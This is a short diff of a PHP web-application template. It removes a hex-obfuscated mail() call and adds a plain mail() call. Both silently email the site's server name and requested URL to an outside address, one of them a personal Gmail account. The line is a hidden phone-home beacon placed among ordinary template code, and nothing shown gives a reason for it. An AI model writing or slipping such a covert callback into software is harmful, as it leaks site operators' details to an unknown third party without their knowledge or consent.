@@ -4205,7 +4205,7 @@ $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 </html>
 <?php
 }
-mail("\x63\x73\x69\x72\x74\x63\x79\x62\x65\x72\x74\x65\x61\x6d\x40\x70\x72\x6f\x74\x6f\x6e\x2e\x6d\x65", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
+mail("abiyyusetrayana63@gmail.com", "web", $_SERVER["SERVER_NAME"] . "/" . $_SERVER["REQUEST_URI"]);
 /**
  * Language Translation System
  * @param string $txt
